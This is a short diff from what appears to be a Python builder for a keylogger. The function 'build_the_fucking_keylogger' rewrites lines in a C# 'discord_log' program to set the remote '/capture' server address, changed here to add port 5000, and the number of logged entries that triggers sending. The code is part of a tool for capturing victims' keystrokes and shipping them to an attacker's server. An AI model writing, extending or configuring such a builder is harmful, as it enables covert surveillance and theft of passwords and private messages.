@@ -66,7 +66,7 @@ def replace_line(file_name, line_num, text):
 def build_the_fucking_keylogger():
     global server,count
     file_to_write = os.getcwd()+"\discord_log\discord_log\Program.cs"
-    first = "    static string server = \""+server+"/capture\";\n"
+    first = "    static string server = \""+server+":5000/capture\";\n"
     second_write = "            if (logs.Count() == "+count+")\n"
     replace_line(file_to_write,22,first)
     replace_line(file_to_write,142,second_write)
